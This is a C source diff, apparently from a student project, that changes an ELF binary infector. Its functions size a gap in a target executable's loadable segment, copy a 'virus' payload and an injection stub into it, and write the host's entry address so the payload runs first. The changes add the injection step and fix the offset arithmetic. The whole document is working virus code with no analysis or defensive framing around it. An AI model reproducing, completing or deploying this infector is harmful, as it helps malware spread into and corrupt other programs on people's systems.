@@ -7,7 +7,7 @@ int			get_size_needed(t_elf *elf, t_elf *virus_elf)
 
 	//TODO: gérer si pas de next (aka inject.o -> inject SGF)
 	next = elf->pt_load + 1;
-	diff = (virus_elf->size - (next->p_offset - (elf->pt_load->p_offset + elf->pt_load->p_filesz)));
+	diff = ((virus_elf->size + INJECT_SIZE) - (next->p_offset - (elf->pt_load->p_offset + elf->pt_load->p_filesz)));
 	return (diff);
 }
 
@@ -18,9 +18,9 @@ void	add_injection(void **dst, t_elf *elf)
 
 	memcpy(*dst, INJECT, INJECT_SIZE - (sizeof(uint64_t) * 3));
 	*dst += INJECT_SIZE - (sizeof(uint64_t) * 3);
-	memcpy(*dst, &elf->pt_load->p_vaddr, sizeof(uint64_t));
+	memcpy(*dst + sizeof(uint64_t) * 0, &elf->pt_load->p_vaddr, sizeof(uint64_t));
 	offset_inject = 0;
-	memcpy(*dst + sizeof(uint64_t), &offset_inject, sizeof(uint64_t));
+	memcpy(*dst + sizeof(uint64_t) * 1, &offset_inject, sizeof(uint64_t));
 	entry = 0;
 	memcpy(*dst + sizeof(uint64_t) * 2, &entry, sizeof(uint64_t));
 	*dst += sizeof(uint64_t) * 3;
@@ -43,10 +43,11 @@ void	create_infection(void *dst, t_elf *elf, t_elf *virus_elf, int nb_zero)
 	src += pt_load_size_left;
 	memcpy(dst, virus_elf->addr, virus_elf->size);
 	dst += virus_elf->size;
+	add_injection(&dst, elf);
 	memset(dst, 0, nb_zero);
 	dst += nb_zero;
 	// TODO: fix for thin files like inject
-	src += virus_elf->size - get_size_needed(elf, virus_elf);
+	src += (virus_elf->size + INJECT_SIZE) - get_size_needed(elf, virus_elf);
 	src = add_padding_sections(elf, virus_elf, src, &dst, nb_zero);
 	memcpy(dst, src, (unsigned long)end - (unsigned long)src);
 }
